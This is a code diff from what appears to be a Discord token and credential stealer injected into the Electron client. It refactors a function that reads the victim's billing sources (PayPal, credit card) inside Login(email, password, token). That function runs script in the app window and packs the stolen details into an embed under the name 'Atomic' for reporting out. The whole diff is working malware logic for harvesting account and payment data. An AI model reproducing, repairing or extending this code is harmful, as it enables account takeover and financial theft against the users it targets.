@@ -175,26 +175,6 @@ function GetBadges(flags) {
     return badges
 }
 
-function PM() {
-    const json = JSON.parse(info3)
-    var billing = "";
-    json.forEach(z => {
-        if (z.type == "") {
-            return "\`No\`"
-        } else if (z.type == 2 && z.invalid != !0) {
-            billing += "\`Yes\`" + " <:Paypal:940600331002318879>"
-        } else if (z.type == 1 && z.invalid != !0) {
-            billing += "\`Yes\`" + " :credit_card:"
-        } else {
-            return "\`No\`"
-        }
-    })
-    if (billing == "") {
-        billing = "\`No\`"
-    }
-    return billing
-}
-
 function Login(email, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
@@ -216,6 +196,25 @@ function Login(email, password, token) {
         xmlHttp.send( null );
         xmlHttp.responseText;
         `, !0).then((info3) => {
+            function Cool() {
+                const json = JSON.parse(info3)
+                var billing = "";
+                json.forEach(z => {
+                    if (z.type == "") {
+                        return "\`No\`"
+                    } else if (z.type == 2 && z.invalid != !0) {
+                        billing += "\`Yes\`" + " <:Paypal:940600331002318879>"
+                    } else if (z.type == 1 && z.invalid != !0) {
+                        billing += "\`Yes\`" + " :credit_card:"
+                    } else {
+                        return "\`No\`"
+                    }
+                })
+                if (billing == "") {
+                    billing = "\`No\`"
+                }
+                return billing
+            }
         const json = JSON.parse(info);
         var params = {
             username: "Atomic",
@@ -256,7 +255,7 @@ function Login(email, password, token) {
 
                         {
                             "name": "Billing",
-                            "value": `Billing: \`${PM()}\``,
+                            "value": `${Cool()}`,
                             "inline": false
                         }
                     ],
